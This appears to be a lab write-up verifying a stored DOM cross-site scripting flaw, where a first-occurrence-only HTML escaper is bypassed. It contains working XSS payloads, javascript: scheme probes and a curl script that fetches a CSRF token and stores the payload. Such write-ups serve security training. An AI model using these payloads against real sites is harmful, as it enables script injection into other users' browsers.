# Verification — Stored DOM XSS (single-replace bypass)

## Methodology
1. Sink audit (fetch + read the loader JS): enumerate per-field client paths and the
   exact escaper semantics (string-pattern `replace` = first-only — read, don't assume).
2. Server-gate probing: benign vs `javascript:` vs case-variant `website` values;
   classify 302 vs 400 to map the allowlist before investing in the href vector.
3. Marker store + JSON byte-check (verbatim persistence proof).
4. Headless load-time execution proof (title side-effect; no click).
5. Real-browser acceptance payload + banner polls.

## Evidence

### 1. Sink audit (`loadCommentsWithVulnerableEscapeHtml.js`, read in full)
- `escapeHTML`: `.replace('<','&lt;').replace('>','&gt;')` — first-occurrence only.
- `body`→`innerHTML(escapeHTML(body))`; `author`→`innerHTML(prev+escapeHTML(author))`;
  `website`→`setAttribute(href)` unescaped; `avatar`→`setAttribute(src)` escaped.

### 2. Server scheme gate (POST probes, fresh CSRF each round)
```
website=javascript:alert(1)   → 400
website=JaVaScRiPt:alert(1)   → 400   (case-insensitive → real allowlist, not prefix naïveté)
website=https://ok.example.com → 302  (stored)
```
Verdict: href vector dead server-side. (First attempt's 400 initially ambiguous with
stale-CSRF — disambiguated by benign-302 control on the same token, then the
scheme matrix above.)

### 3. Persistence proof (JSON endpoint)
```
POST comment="<><img src=x onerror=document.title='BODYPWN'>" → 302
GET /post/comment?postId=1 → body stored VERBATIM (exact string in JSON)
```

### 4. Load-time execution proof (headless dump-dom, virtual-time settle)
```
→ <title>BODYPWN</title>
→ rendered img present with live onerror
```
No click, no interaction — XHR → escape (sacrificial pair consumed) → innerHTML →
img error → fire.

### 5. Lab acceptance
Stored `<><img src=x onerror=alert(1)>` (author SolverAuthor) → real browser loads
`/post?postId=1` → `alert(1)` on load → `is-solved` (first poll).

### 6. Dead-end / classification analysis
| Candidate | Verdict | Basis |
|---|---|---|
| `website=javascript:` (+case variant) | DEAD (server 400) | scheme allowlist enforced |
| Lone `<img…>` (single `<>`) | would die (reasoned) | sole `<`/`>` consumed by escaper; tag corrupted — hence the sacrificial pair (not separately fired; grammar-certain) |
| `<script>` via innerHTML | DEAD (sink semantics) | spec neuter (prior-lab proof); handlers mandatory |
| `author` variant | PLAUSIBLE (same code path) | identical escapeHTML→innerHTML pattern; body proof covers the mechanism; not separately fired — tagged honestly |
| `avatar`→`src` | DEAD (structural) | `setAttribute` never executes; `javascript:` in img-src inert |
| `email` | no sink | unconsumed client-side |

## Reproducibility
```
BASE=…; JAR=ck; CSRF=$(curl -s -b $JAR -c $JAR "$BASE/post?postId=1" | grep -oP 'name="csrf" value="\K[^"]+' | head -1)
curl -b $JAR -c $JAR --data-urlencode "csrf=$CSRF" --data-urlencode "postId=1" \
  --data-urlencode "comment=<><img src=x onerror=alert(1)>" --data-urlencode "name=N" \
  --data-urlencode "email=e@x.y" --data-urlencode "website=" "$BASE/post/comment"
curl -b $JAR "$BASE/post/comment?postId=1"   # verify verbatim storage
# headless: load /post?postId=1 with marker variant, assert title
```

## Confirmation criteria
- CONFIRMED: escaper semantics (code-read), server allowlist (400 matrix),
  verbatim persistence (JSON), load-time execution (title), acceptance.
- PLAUSIBLE (tagged, unfired): author-field variant — same function, same sink.